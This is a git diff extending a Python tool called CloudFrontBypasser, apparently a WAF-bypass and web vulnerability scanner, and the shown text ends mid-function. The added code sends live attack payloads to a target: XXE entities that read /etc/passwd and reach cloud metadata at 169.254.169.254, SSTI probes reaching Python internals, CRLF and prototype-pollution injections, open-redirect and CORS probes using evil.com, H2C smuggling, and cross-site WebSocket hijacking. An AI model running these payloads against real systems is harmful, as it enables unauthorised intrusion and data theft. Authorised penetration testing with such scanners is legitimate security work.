@@ -13,6 +13,8 @@ import time
 import hashlib
 import logging
 import socket
+import ssl
+import json
 import re
 from typing import Optional, List, Dict, Any, Tuple, Set
 from functools import lru_cache
@@ -570,6 +572,7 @@ class CloudFrontBypasser:
             self._test_header_injection,
             self._test_origin_header_bypass,
             self._test_custom_header_fuzzing,
+            self._test_ip_spoofing_headers,
             
             # === Encoding Bypass Scans ===
             self._test_encoding_bypass,
@@ -577,6 +580,7 @@ class CloudFrontBypasser:
             self._test_case_manipulation,
             self._test_comment_injection,
             self._test_whitespace_manipulation,
+            self._test_unicode_normalization,
             
             # === HTTP Method & Protocol Scans ===
             self._test_method_bypass,
@@ -587,7 +591,9 @@ class CloudFrontBypasser:
             # === Protocol-Level Scans ===
             self._test_transfer_encoding_smuggling,
             self._test_http2_downgrade,
+            self._test_http2_specific_attacks,
             self._test_websocket_upgrade,
+            self._test_websocket_security,
             self._test_chunked_transfer,
             self._test_http_pipelining,
             
@@ -602,6 +608,16 @@ class CloudFrontBypasser:
             self._test_command_injection_bypass,
             self._test_path_traversal_bypass,
             self._test_ssrf_bypass,
+            
+            # === NEW: Injection Tests ===
+            self._test_nosql_injection,
+            self._test_ldap_injection,
+            self._test_ssti_detection,
+            self._test_xxe_detection,
+            self._test_crlf_injection,
+            self._test_prototype_pollution,
+            self._test_json_injection,
+            self._test_deserialization,
             
             # === Rate Limit & Threshold Testing ===
             self._test_rate_limit_detection,
@@ -623,6 +639,67 @@ class CloudFrontBypasser:
             self._test_polyglot_payloads,
             self._test_time_based_detection,
             self._test_race_condition,
+            
+            # === NEW: Security Misconfiguration ===
+            self._test_cors_misconfiguration,
+            self._test_open_redirect,
+            self._test_security_headers,
+            self._test_cookie_security,
+            self._test_clickjacking,
+            
+            # === NEW: Information Disclosure ===
+            self._test_information_disclosure,
+            self._test_subdomain_takeover,
+            
+            # === NEW: Business Logic ===
+            self._test_api_versioning_bypass,
+            self._test_mass_assignment,
+            self._test_idor_detection,
+            self._test_business_logic_flaws,
+            self._test_email_header_injection,
+            self._test_file_upload_bypass,
+            self._test_response_splitting,
+            
+            # === NEW: Cloud-Specific ===
+            self._test_azure_blob_enumeration,
+            self._test_gcp_bucket_discovery,
+            self._test_serverless_functions,
+            self._test_kubernetes_api,
+            self._test_cloud_provider_detection,
+            
+            # === v1.4: Advanced Protocol Attacks ===
+            self._test_graphql_deep_testing,
+            self._test_jwt_attacks,
+            self._test_web_cache_deception,
+            self._test_log4shell_patterns,
+            self._test_ssrf_protocol_smuggling,
+            
+            # === v1.5: Extended Security Tests ===
+            self._test_host_header_attacks,
+            self._test_ssi_injection,
+            self._test_api_key_exposure,
+            self._test_dns_zone_transfer,
+            self._test_verb_tampering_extended,
+            self._test_range_header_attacks,
+            self._test_multipart_bypass,
+            
+            # === v1.6: Advanced Discovery ===
+            self._test_dns_rebinding,
+            self._test_timing_based_discovery,
+            self._test_error_based_disclosure,
+            self._test_path_normalization_extended,
+            self._test_content_sniffing,
+            self._test_buffer_limits,
+            
+            # === v1.7: Dangerous Attack Vectors ===
+            self._test_http_desync,
+            self._test_dangling_markup,
+            self._test_css_injection,
+            self._test_xslt_injection,
+            self._test_pdf_injection,
+            self._test_postmessage_vulnerabilities,
+            self._test_rpo_attack,
+            self._test_integer_overflow,
             
             # === Reconnaissance Features ===
             self._enumerate_subdomains,
@@ -2441,6 +2518,4523 @@ class CloudFrontBypasser:
                         
             except Exception as e:
                 logger.debug(f"Race condition test error for {endpoint}: {e}")
+        
+        return results
+
+    # ============================================================================
+    # NEW SECURITY TESTS - HIGH VALUE
+    # ============================================================================
+    
+    def _test_cors_misconfiguration(self) -> List[Dict[str, Any]]:
+        """Test for CORS misconfigurations that could allow unauthorized cross-origin access"""
+        results = []
+        print("  [*] Testing CORS misconfiguration...")
+        
+        cors_tests = [
+            # Test null origin
+            {'Origin': 'null'},
+            # Test wildcard reflection
+            {'Origin': 'https://evil.com'},
+            # Test subdomain bypass
+            {'Origin': f'https://evil.{self.domain}'},
+            # Test prefix bypass
+            {'Origin': f'https://{self.domain}.evil.com'},
+            # Test suffix bypass
+            {'Origin': f'https://evil{self.domain}'},
+            # Test protocol downgrade
+            {'Origin': f'http://{self.domain}'},
+            # Test with credentials
+            {'Origin': 'https://attacker.com'},
+        ]
+        
+        for test_headers in cors_tests:
+            try:
+                resp = safe_request(
+                    self.target,
+                    timeout=self.timeout,
+                    allow_redirects=False,
+                    headers=test_headers
+                )
+                
+                if resp:
+                    acao = resp.headers.get('Access-Control-Allow-Origin', '')
+                    acac = resp.headers.get('Access-Control-Allow-Credentials', '')
+                    
+                    origin_sent = test_headers['Origin']
+                    
+                    # Check for dangerous CORS configurations
+                    is_vulnerable = False
+                    reason = ""
+                    severity = "INFO"
+                    
+                    if acao == '*':
+                        is_vulnerable = True
+                        reason = "Wildcard (*) ACAO header - allows any origin"
+                        severity = "MEDIUM"
+                    elif acao == origin_sent and origin_sent != f'https://{self.domain}':
+                        is_vulnerable = True
+                        reason = f"Origin reflected: {origin_sent}"
+                        severity = "HIGH" if acac.lower() == 'true' else "MEDIUM"
+                    elif acao == 'null':
+                        is_vulnerable = True
+                        reason = "Null origin allowed"
+                        severity = "HIGH"
+                    
+                    if is_vulnerable:
+                        result = {
+                            'technique': f'CORS Misconfiguration: {origin_sent[:30]}',
+                            'bypass': True,
+                            'status': resp.status_code,
+                            'reason': reason,
+                            'severity': severity,
+                            'category': 'CORS_MISCONFIG',
+                            'details': {'acao': acao, 'acac': acac, 'origin_tested': origin_sent}
+                        }
+                        results.append(result)
+                        print(f"  [✓] CORS Vuln: {reason}")
+                        
+            except Exception as e:
+                logger.debug(f"CORS test error: {e}")
+        
+        return results
+    
+    def _test_open_redirect(self) -> List[Dict[str, Any]]:
+        """Test for open redirect vulnerabilities"""
+        results = []
+        print("  [*] Testing open redirect...")
+        
+        redirect_payloads = [
+            # Common redirect parameters
+            ('?redirect=https://evil.com', 'redirect param'),
+            ('?url=https://evil.com', 'url param'),
+            ('?next=https://evil.com', 'next param'),
+            ('?return=https://evil.com', 'return param'),
+            ('?returnUrl=https://evil.com', 'returnUrl param'),
+            ('?return_url=https://evil.com', 'return_url param'),
+            ('?continue=https://evil.com', 'continue param'),
+            ('?dest=https://evil.com', 'dest param'),
+            ('?destination=https://evil.com', 'destination param'),
+            ('?redir=https://evil.com', 'redir param'),
+            ('?redirect_uri=https://evil.com', 'redirect_uri param'),
+            ('?target=https://evil.com', 'target param'),
+            ('?view=https://evil.com', 'view param'),
+            ('?to=https://evil.com', 'to param'),
+            ('?out=https://evil.com', 'out param'),
+            ('?go=https://evil.com', 'go param'),
+            ('?link=https://evil.com', 'link param'),
+            # Protocol-relative URL bypass
+            ('?redirect=//evil.com', 'protocol-relative'),
+            # Backslash bypass
+            ('?redirect=https://evil.com\\@legitimate.com', 'backslash bypass'),
+            # URL encoding bypass
+            ('?redirect=https%3A%2F%2Fevil.com', 'URL encoded'),
+            # Double URL encoding
+            ('?redirect=https%253A%252F%252Fevil.com', 'double encoded'),
+            # Whitespace bypass
+            ('?redirect= https://evil.com', 'leading space'),
+            ('?redirect=%20https://evil.com', 'encoded space'),
+            # Tab/newline bypass
+            ('?redirect=%09https://evil.com', 'tab bypass'),
+            ('?redirect=%0ahttps://evil.com', 'newline bypass'),
+        ]
+        
+        for payload, technique in redirect_payloads:
+            try:
+                resp = safe_request(
+                    f"{self.target}{payload}",
+                    timeout=self.timeout,
+                    allow_redirects=False
+                )
+                
+                if resp and resp.status_code in [301, 302, 303, 307, 308]:
+                    location = resp.headers.get('Location', '')
+                    
+                    if 'evil.com' in location.lower() or location.startswith('//evil'):
+                        result = {
+                            'technique': f'Open Redirect: {technique}',
+                            'bypass': True,
+                            'status': resp.status_code,
+                            'reason': f'Redirects to: {location[:50]}',
+                            'severity': 'HIGH',
+                            'category': 'OPEN_REDIRECT',
+                            'details': {'payload': payload, 'location': location}
+                        }
+                        results.append(result)
+                        print(f"  [✓] Open Redirect: {technique} -> {location[:40]}")
+                        
+            except Exception as e:
+                logger.debug(f"Open redirect test error: {e}")
+        
+        return results
+    
+    def _test_crlf_injection(self) -> List[Dict[str, Any]]:
+        """Test for CRLF injection (HTTP response splitting)"""
+        results = []
+        print("  [*] Testing CRLF injection...")
+        
+        crlf_payloads = [
+            # Standard CRLF
+            ('?param=test%0d%0aInjected-Header:injected', '%0d%0a'),
+            # Double CRLF for body injection
+            ('?param=test%0d%0a%0d%0a<html>injected</html>', 'body injection'),
+            # URL encoded variations
+            ('?param=test%0D%0AInjected:value', 'uppercase encoded'),
+            # Unicode CRLF
+            ('?param=test%E5%98%8D%E5%98%8AInjected:value', 'unicode CRLF'),
+            # Mixed encoding
+            ('?param=test%0d%0a%20Injected:value', 'with space'),
+            # Header injection via param
+            ('?param=test%0d%0aSet-Cookie:evil=value', 'cookie injection'),
+            ('?param=test%0d%0aX-XSS-Protection:0', 'security header injection'),
+            # In different contexts
+            ('/path%0d%0aInjected:value', 'path CRLF'),
+        ]
+        
+        test_cases = []
+        for payload, technique in crlf_payloads:
+            test_cases.append({
+                'headers': {},
+                'path': payload,
+                'technique': f'CRLF: {technique}'
+            })
+        
+        # Also test header injection
+        header_crlf_tests = [
+            {'X-Custom': 'test\r\nInjected: value'},
+            {'X-Custom': 'test%0d%0aInjected: value'},
+            {'User-Agent': 'test\r\nInjected: value'},
+        ]
+        
+        for headers in header_crlf_tests:
+            try:
+                resp = safe_request(
+                    self.target,
+                    timeout=self.timeout,
+                    headers=headers,
+                    allow_redirects=False
+                )
+                
+                if resp:
+                    # Check if injected header appears in response
+                    resp_headers_str = str(resp.headers).lower()
+                    if 'injected' in resp_headers_str:
+                        result = {
+                            'technique': 'CRLF: Header Injection',
+                            'bypass': True,
+                            'status': resp.status_code,
+                            'reason': 'Injected header reflected in response',
+                            'severity': 'HIGH',
+                            'category': 'CRLF_INJECTION'
+                        }
+                        results.append(result)
+                        print(f"  [✓] CRLF: Header injection successful")
+                        
+            except Exception as e:
+                logger.debug(f"CRLF header test error: {e}")
+        
+        batch_results = self._batch_test(test_cases)
+        for r in batch_results:
+            r['category'] = 'CRLF_INJECTION'
+            results.append(r)
+        
+        return results
+    
+    def _test_prototype_pollution(self) -> List[Dict[str, Any]]:
+        """Test for prototype pollution vulnerabilities"""
+        results = []
+        print("  [*] Testing prototype pollution...")
+        
+        pollution_payloads = [
+            # Query string pollution
+            ('?__proto__[polluted]=true', 'query __proto__'),
+            ('?__proto__.polluted=true', 'query __proto__ dot'),
+            ('?constructor[prototype][polluted]=true', 'query constructor.prototype'),
+            ('?constructor.prototype.polluted=true', 'query constructor.prototype dot'),
+            # Array notation
+            ('?__proto__[0]=polluted', 'array proto'),
+            # Nested pollution
+            ('?a[__proto__][polluted]=true', 'nested proto'),
+            # Common framework params
+            ('?config[__proto__][polluted]=true', 'config proto'),
+            ('?settings[__proto__][polluted]=true', 'settings proto'),
+            # JSON body pollution
+        ]
+        
+        test_cases = [
+            {'headers': {}, 'path': path, 'technique': f'Proto Pollution: {technique}'}
+            for path, technique in pollution_payloads
+        ]
+        
+        batch_results = self._batch_test(test_cases)
+        
+        # Also test JSON body pollution
+        json_payloads = [
+            {'__proto__': {'polluted': True}},
+            {'constructor': {'prototype': {'polluted': True}}},
+            {'a': {'__proto__': {'polluted': True}}},
+        ]
+        
+        for json_payload in json_payloads:
+            try:
+                import json
+                resp = self._session.post(
+                    self.target,
+                    json=json_payload,
+                    timeout=self.timeout,
+                    verify=False
+                )
+                
+                if resp and resp.status_code in [200, 201]:
+                    # Check if pollution indicators in response
+                    if 'polluted' in resp.text.lower() or 'true' in resp.text.lower():
+                        result = {
+                            'technique': 'Proto Pollution: JSON body',
+                            'bypass': True,
+                            'status': resp.status_code,
+                            'reason': 'Pollution payload accepted',
+                            'severity': 'HIGH',
+                            'category': 'PROTOTYPE_POLLUTION'
+                        }
+                        results.append(result)
+                        print(f"  [✓] Prototype Pollution: JSON body may be vulnerable")
+                        
+            except Exception as e:
+                logger.debug(f"JSON pollution test error: {e}")
+        
+        for r in batch_results:
+            r['category'] = 'PROTOTYPE_POLLUTION'
+            results.append(r)
+        
+        return results
+    
+    def _test_ssti_detection(self) -> List[Dict[str, Any]]:
+        """Test for Server-Side Template Injection"""
+        results = []
+        print("  [*] Testing SSTI (Server-Side Template Injection)...")
+        
+        ssti_payloads = [
+            # Jinja2/Twig
+            ('{{7*7}}', 'Jinja2/Twig', '49'),
+            ('{{7*\'7\'}}', 'Jinja2 string mult', '7777777'),
+            ('{%25 set x = 7*7 %25}{{x}}', 'Jinja2 set', '49'),
+            # Freemarker
+            ('${7*7}', 'Freemarker/EL', '49'),
+            ('#{7*7}', 'Freemarker alt', '49'),
+            # Velocity
+            ('#set($x=7*7)$x', 'Velocity', '49'),
+            # Smarty
+            ('{php}echo 7*7;{/php}', 'Smarty PHP', '49'),
+            ('{7*7}', 'Smarty math', '49'),
+            # ERB (Ruby)
+            ('<%=7*7%>', 'ERB', '49'),
+            # Pebble
+            ('{% set x = 7*7 %}{{x}}', 'Pebble', '49'),
+            # Mako
+            ('${7*7}', 'Mako', '49'),
+            # Thymeleaf
+            ('[[${7*7}]]', 'Thymeleaf', '49'),
+            # Generic detection
+            ('{{constructor.constructor(\'return 7*7\')()}}', 'JS Template', '49'),
+            # Python specific
+            ('{{config}}', 'Jinja2 config leak', 'config'),
+            ('{{self.__class__}}', 'Jinja2 class access', 'class'),
+            # Nested/encoded
+            ('{{\'\'.__class__.__mro__[2].__subclasses__()}}', 'Jinja2 subclasses', 'subclasses'),
+        ]
+        
+        for payload, engine, expected in ssti_payloads:
+            try:
+                encoded_payload = quote(payload)
+                resp = safe_request(
+                    f"{self.target}/?test={encoded_payload}",
+                    timeout=self.timeout,
+                    allow_redirects=True
+                )
+                
+                if resp and expected in resp.text:
+                    severity = 'CRITICAL' if expected == '49' or 'class' in expected else 'HIGH'
+                    result = {
+                        'technique': f'SSTI: {engine}',
+                        'bypass': True,
+                        'status': resp.status_code,
+                        'reason': f'Template evaluated: {payload[:30]} -> {expected}',
+                        'severity': severity,
+                        'category': 'SSTI',
+                        'details': {'engine': engine, 'payload': payload}
+                    }
+                    results.append(result)
+                    print(f"  [✓] CRITICAL: SSTI detected ({engine})")
+                    
+            except Exception as e:
+                logger.debug(f"SSTI test error: {e}")
+        
+        return results
+    
+    def _test_xxe_detection(self) -> List[Dict[str, Any]]:
+        """Test for XML External Entity (XXE) injection"""
+        results = []
+        print("  [*] Testing XXE (XML External Entity)...")
+        
+        xxe_payloads = [
+            # Basic file read
+            ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>', 'file read'),
+            # PHP filter
+            ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><foo>&xxe;</foo>', 'php filter'),
+            # Parameter entity
+            ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]><foo></foo>', 'parameter entity'),
+            # SSRF via XXE
+            ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>', 'SSRF'),
+            # Billion laughs (DoS detection)
+            ('<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;">]><lolz>&lol2;</lolz>', 'billion laughs'),
+            # XInclude
+            ('<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>', 'XInclude'),
+        ]
+        
+        xml_endpoints = [
+            self.target,
+            f"{self.target}/api",
+            f"{self.target}/upload",
+            f"{self.target}/import",
+            f"{self.target}/parse",
+        ]
+        
+        for endpoint in xml_endpoints:
+            for payload, technique in xxe_payloads:
+                try:
+                    resp = self._session.post(
+                        endpoint,
+                        data=payload,
+                        headers={'Content-Type': 'application/xml'},
+                        timeout=self.timeout,
+                        verify=False
+                    )
+                    
+                    if resp:
+                        # Check for XXE indicators
+                        indicators = ['root:', '/bin/bash', 'nobody', 'daemon', '169.254', 'meta-data', 'lollol']
+                        for indicator in indicators:
+                            if indicator in resp.text:
+                                result = {
+                                    'technique': f'XXE: {technique}',
+                                    'bypass': True,
+                                    'status': resp.status_code,
+                                    'reason': f'XXE successful at {endpoint}',
+                                    'severity': 'CRITICAL',
+                                    'category': 'XXE',
+                                    'details': {'endpoint': endpoint, 'technique': technique}
+                                }
+                                results.append(result)
+                                print(f"  [✓] CRITICAL: XXE detected ({technique})")
+                                break
+                                
+                except Exception as e:
+                    logger.debug(f"XXE test error: {e}")
+        
+        # Also test SOAP endpoints
+        soap_payload = '''<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
+<soap:Body><foo>&xxe;</foo></soap:Body>
+</soap:Envelope>'''
+        
+        soap_endpoints = ['/soap', '/wsdl', '/ws', '/service', '/api/soap']
+        for endpoint in soap_endpoints:
+            try:
+                resp = self._session.post(
+                    f"{self.target}{endpoint}",
+                    data=soap_payload,
+                    headers={'Content-Type': 'application/soap+xml'},
+                    timeout=self.timeout,
+                    verify=False
+                )
+                if resp and 'root:' in resp.text:
+                    result = {
+                        'technique': 'XXE: SOAP Endpoint',
+                        'bypass': True,
+                        'status': resp.status_code,
+                        'reason': f'SOAP XXE at {endpoint}',
+                        'severity': 'CRITICAL',
+                        'category': 'XXE'
+                    }
+                    results.append(result)
+                    print(f"  [✓] CRITICAL: SOAP XXE detected")
+            except:
+                pass
+        
+        return results
+    
+    def _test_deserialization(self) -> List[Dict[str, Any]]:
+        """Test for insecure deserialization vulnerabilities"""
+        results = []
+        print("  [*] Testing insecure deserialization...")
+        
+        # Java serialization magic bytes (base64)
+        java_payloads = [
+            # ysoserial CommonCollections payloads (base64 encoded markers)
+            ('rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==', 'Java HashMap'),
+            ('rO0ABXNyABNqYXZhLnV0aWwuSGFzaHRhYmxl', 'Java Hashtable'),
+        ]
+        
+        # PHP serialization
+        php_payloads = [
+            ('O:8:"stdClass":0:{}', 'PHP Object'),
+            ('a:1:{s:4:"test";s:4:"test";}', 'PHP Array'),
+            # PHP POP chain attempt
+            ('O:10:"__destruct":0:{}', 'PHP destruct'),
+        ]
+        
+        # Python pickle (base64)
+        python_payloads = [
+            ('gASVEAAAAAAAAACMBHRlc3SUjAR0ZXN0lIaULg==', 'Python pickle'),
+        ]
+        
+        # .NET ViewState
+        dotnet_payloads = [
+            ('__VIEWSTATE', 'ASP.NET ViewState'),
+        ]
+        
+        # Test Java serialization
+        for payload, technique in java_payloads:
+            try:
+                # Test in body
+                resp = self._session.post(
+                    self.target,
+                    data=payload,
+                    headers={'Content-Type': 'application/x-java-serialized-object'},
+                    timeout=self.timeout,
+                    verify=False
+                )
+                
+                if resp and resp.status_code not in [400, 415]:
+                    # Server accepted serialized data
+                    result = {
+                        'technique': f'Deserialization: {technique}',
+                        'bypass': True,
+                        'status': resp.status_code,
+                        'reason': 'Server accepts Java serialized objects',
+                        'severity': 'HIGH',
+                        'category': 'DESERIALIZATION'
+                    }
+                    results.append(result)
+                    print(f"  [!] Potential: {technique} accepted")
+                    
+            except Exception as e:
+                logger.debug(f"Java deser test error: {e}")
+        
+        # Test PHP serialization
+        for payload, technique in php_payloads:
+            try:
+                resp = self._session.post(
+                    self.target,
+                    data=payload,
+                    headers={'Content-Type': 'application/x-php-serialized'},
+                    timeout=self.timeout,
+                    verify=False
+                )
+                
+                # Also test in query params
+                resp2 = safe_request(
+                    f"{self.target}/?data={quote(payload)}",
+                    timeout=self.timeout
+                )
+                
+                for r in [resp, resp2]:
+                    if r and 'unserialize' not in r.text.lower() and r.status_code not in [400, 415, 500]:
+                        if 'stdClass' in r.text or 'Object' in r.text:
+                            result = {
+                                'technique': f'Deserialization: {technique}',
+                                'bypass': True,
+                                'status': r.status_code,
+                                'reason': 'PHP serialized data processed',
+                                'severity': 'HIGH',
+                                'category': 'DESERIALIZATION'
+                            }
+                            results.append(result)
+                            print(f"  [!] Potential: {technique} processed")
+                            
+            except Exception as e:
+                logger.debug(f"PHP deser test error: {e}")
+        
+        # Check for ViewState
+        try:
+            resp = safe_request(self.target, timeout=self.timeout)
+            if resp and '__VIEWSTATE' in resp.text:
+                # Check if ViewState is unencrypted/unsigned
+                import re
+                viewstate_match = re.search(r'__VIEWSTATE["\s]+value="([^"]+)"', resp.text)
+                if viewstate_match:
+                    viewstate = viewstate_match.group(1)
+                    # Check if it's base64 (unencrypted)
+                    if viewstate.startswith('/w') or viewstate.startswith('dD'):
+                        result = {
+                            'technique': 'Deserialization: ASP.NET ViewState',
+                            'bypass': True,
+                            'status': resp.status_code,
+                            'reason': 'Unencrypted ViewState detected',
+                            'severity': 'MEDIUM',
+                            'category': 'DESERIALIZATION',
+                            'details': {'viewstate_preview': viewstate[:50]}
+                        }
+                        results.append(result)
+                        print(f"  [!] ASP.NET ViewState detected (potentially exploitable)")
+        except Exception as e:
+            logger.debug(f"ViewState check error: {e}")
+        
+        return results
+    
+    def _test_http2_specific_attacks(self) -> List[Dict[str, Any]]:
+        """Test HTTP/2 specific attacks including H2C smuggling"""
+        results = []
+        print("  [*] Testing HTTP/2 specific attacks...")
+        
+        # H2C (HTTP/2 Cleartext) Smuggling
+        h2c_tests = [
+            # Standard H2C upgrade
+            {
+                'headers': {
+                    'Upgrade': 'h2c',
+                    'Connection': 'Upgrade, HTTP2-Settings',
+                    'HTTP2-Settings': 'AAMAAABkAARAAAAAAAIAAAAA',
+                },
+                'technique': 'H2C Upgrade Standard'
+            },
+            # H2C with request smuggling
+            {
+                'headers': {
+                    'Upgrade': 'h2c',
+                    'Connection': 'Upgrade, HTTP2-Settings',
+                    'HTTP2-Settings': 'AAMAAABkAARAAAAAAAIAAAAA',
+                    'Content-Length': '0',
+                },
+                'technique': 'H2C Smuggling Attempt'
+            },
+            # HTTP/2 CONNECT method
+            {
+                'headers': {
+                    ':method': 'CONNECT',
+                    ':authority': 'internal-server:80',
+                },
+                'technique': 'HTTP/2 CONNECT Tunnel'
+            },
+        ]
+        
+        for test in h2c_tests:
+            try:
+                resp = safe_request(
+                    self.target,
+                    timeout=self.timeout,
+                    headers=test['headers'],
+                    allow_redirects=False
+                )
+                
+                if resp:
+                    # Check for successful H2C upgrade
+                    if resp.status_code == 101 or 'upgrade' in resp.headers.get('Connection', '').lower():
+                        result = {
+                            'technique': f"HTTP/2: {test['technique']}",
+                            'bypass': True,
+                            'status': resp.status_code,
+                            'reason': 'H2C upgrade accepted - potential smuggling',
+                            'severity': 'HIGH',
+                            'category': 'HTTP2_ATTACK'
+                        }
+                        results.append(result)
+                        print(f"  [✓] HTTP/2 Attack: {test['technique']} successful")
+                        
+            except Exception as e:
+                logger.debug(f"HTTP/2 test error: {e}")
+        
+        # CONTINUATION Frame Flood (detection only)
+        result = {
+            'technique': 'HTTP/2: CONTINUATION Frame Check',
+            'bypass': False,
+            'status': 0,
+            'reason': 'Manual testing recommended for CONTINUATION flood',
+            'severity': 'INFO',
+            'category': 'HTTP2_ATTACK'
+        }
+        results.append(result)
+        
+        return results
+    
+    def _test_websocket_security(self) -> List[Dict[str, Any]]:
+        """Test WebSocket security including CSWSH"""
+        results = []
+        print("  [*] Testing WebSocket security...")
+        
+        # Common WebSocket endpoints
+        ws_endpoints = [
+            '/ws', '/websocket', '/socket', '/socket.io',
+            '/realtime', '/live', '/stream', '/push',
+            '/api/ws', '/api/websocket', '/chat', '/notifications'
+        ]
+        
+        ws_tests = []
+        for endpoint in ws_endpoints:
+            # Test Cross-Site WebSocket Hijacking (CSWSH)
+            ws_tests.append({
+                'headers': {
+                    'Upgrade': 'websocket',
+                    'Connection': 'Upgrade',
+                    'Sec-WebSocket-Key': 'dGhlIHNhbXBsZSBub25jZQ==',
+                    'Sec-WebSocket-Version': '13',
+                    'Origin': 'https://evil.com',  # Cross-origin
+                },
+                'path': endpoint,
+                'technique': f'CSWSH: {endpoint}'
+            })
+            
+            # Test without Origin header
+            ws_tests.append({
+                'headers': {
+                    'Upgrade': 'websocket',
+                    'Connection': 'Upgrade',
+                    'Sec-WebSocket-Key': 'dGhlIHNhbXBsZSBub25jZQ==',
+                    'Sec-WebSocket-Version': '13',
+                },
+                'path': endpoint,
+                'technique': f'WS No Origin: {endpoint}'
+            })
+        
+        for test in ws_tests:
+            try:
+                resp = safe_request(
+                    f"{self.target}{test['path']}",
+                    timeout=self.timeout,
+                    headers=test['headers'],
+                    allow_redirects=False
+                )
+                
+                if resp:
+                    # 101 Switching Protocols means WebSocket upgrade succeeded
+                    if resp.status_code == 101:
+                        is_cswsh = 'evil.com' in test['headers'].get('Origin', '')
+                        result = {
+                            'technique': test['technique'],
+                            'bypass': is_cswsh,
+                            'status': resp.status_code,
+                            'reason': 'WebSocket upgrade accepted' + (' from cross-origin!' if is_cswsh else ''),
+                            'severity': 'HIGH' if is_cswsh else 'INFO',
+                            'category': 'WEBSOCKET_SECURITY'
+                        }
+                        results.append(result)
+                        if is_cswsh:
+                            print(f"  [✓] CSWSH: {test['path']} accepts cross-origin")
+                    elif resp.status_code == 200 and 'websocket' in resp.text.lower():
+                        result = {
+                            'technique': f"WS Endpoint Found: {test['path']}",
+                            'bypass': False,
+                            'status': resp.status_code,
+                            'reason': 'WebSocket endpoint detected',
+                            'severity': 'INFO',
+                            'category': 'WEBSOCKET_SECURITY'
+                        }
+                        results.append(result)
+                        
+            except Exception as e:
+                logger.debug(f"WebSocket test error: {e}")
+        
+        return results
+
+    # ============================================================================
+    # MEDIUM VALUE SECURITY TESTS
+    # ============================================================================
+    
+    def _test_subdomain_takeover(self) -> List[Dict[str, Any]]:
+        """Test for subdomain takeover vulnerabilities"""
+        results = []
+        print("  [*] Testing subdomain takeover...")
+        
+        # Fingerprints for vulnerable services
+        takeover_fingerprints = {
+            'github': ['There isn\'t a GitHub Pages site here', 'github.io'],
+            'heroku': ['No such app', 'herokucdn.com', 'herokuapp.com'],
+            'aws_s3': ['NoSuchBucket', 'The specified bucket does not exist'],
+            'azure': ['404 Web Site not found', '.azurewebsites.net'],
+            'shopify': ['Sorry, this shop is currently unavailable', 'myshopify.com'],
+            'tumblr': ['There\'s nothing here', 'tumblr.com'],
+            'wordpress': ['Do you want to register', 'wordpress.com'],
+            'teamwork': ['Oops - We didn\'t find your site', 'teamwork.com'],
+            'helpjuice': ['We could not find what you\'re looking for', 'helpjuice.com'],
+            'helpscout': ['No settings were found', 'helpscoutdocs.com'],
+            'cargo': ['If you\'re moving your domain', '404 Not Found'],
+            'uservoice': ['This UserVoice subdomain', 'uservoice.com'],
+            'surge': ['project not found', 'surge.sh'],
+            'intercom': ['This page is reserved for', 'custom.intercom.help'],
+            'webflow': ['The page you are looking for doesn\'t exist', 'webflow.io'],
+            'kajabi': ['The page you were looking for doesn\'t exist', 'kajabi.com'],
+            'thinkific': ['You may have mistyped the address', 'thinkific.com'],
+            'tave': ['Sorry, this page is no longer available', 'tave.com'],
+            'wishpond': ['https://www.wishpond.com/404', 'wishpond.com'],
+            'aftership': ['Oops.</h2>', 'aftership.com'],
+            'aha': ['There is no portal here', 'ideas.aha.io'],
+            'brightcove': ['Error - Loss', 'bcvp0rtal.com'],
+            'bigcartel': ['<h1>Oops! We couldn&#8217;t find that page.</h1>', 'bigcartel.com'],
+            'campaignmonitor': ['Trying to access your account?', 'createsend.com'],
+            'acquia': ['The site you are looking for could not be found', 'acquia-test.co'],
+            'fastly': ['Fastly error: unknown domain', 'fastly.net'],
+            'ghost': ['The thing you were looking for is no longer here', 'ghost.io'],
+            'pantheon': ['The gods are wise', 'pantheonsite.io'],
+            'zendesk': ['Help Center Closed', 'zendesk.com'],
+        }
+        
+        # First enumerate subdomains
+        domain_parts = self.domain.split('.')
+        if len(domain_parts) >= 2:
+            base_domain = '.'.join(domain_parts[-2:])
+        else:
+            base_domain = self.domain
+        
+        prefixes = ['www', 'dev', 'staging', 'test', 'api', 'app', 'admin', 'beta', 'cdn', 'mail', 'blog', 'shop', 'store']
+        
+        def check_takeover(subdomain: str) -> Optional[Dict]:
+            try:
+                # Try to resolve and fetch
+                for protocol in ['https', 'http']:
+                    try:
+                        url = f"{protocol}://{subdomain}"
+                        resp = safe_request(url, timeout=5, allow_redirects=True)
+                        
+                        if resp:
+                            body = resp.text.lower()
+                            for service, fingerprints in takeover_fingerprints.items():
+                                for fp in fingerprints:
+                                    if fp.lower() in body:
+                                        return {
+                                            'subdomain': subdomain,
+                                            'service': service,
+                                            'fingerprint': fp,
+                                            'status': resp.status_code
+                                        }
+                    except:
+                        pass
+                        
+                # Check for dangling CNAME
+                try:
+                    import socket
+                    socket.gethostbyname(subdomain)
+                except socket.gaierror as e:
+                    if 'NXDOMAIN' in str(e) or 'not known' in str(e).lower():
+                        return {
+                            'subdomain': subdomain,
+                            'service': 'NXDOMAIN',
+                            'fingerprint': 'DNS not resolving',
+                            'status': 0
+                        }
+            except:
+                pass
+            return None
+        
+        with ThreadPoolExecutor(max_workers=self.threads) as executor:
+            subdomains = [f"{prefix}.{base_domain}" for prefix in prefixes]
+            futures = {executor.submit(check_takeover, sub): sub for sub in subdomains}
+            
+            for future in as_completed(futures):
+                result_data = future.result()
+                if result_data:
+                    severity = 'HIGH' if result_data['service'] != 'NXDOMAIN' else 'MEDIUM'
+                    result = {
+                        'technique': f"Subdomain Takeover: {result_data['subdomain']}",
+                        'bypass': True,
+                        'status': result_data['status'],
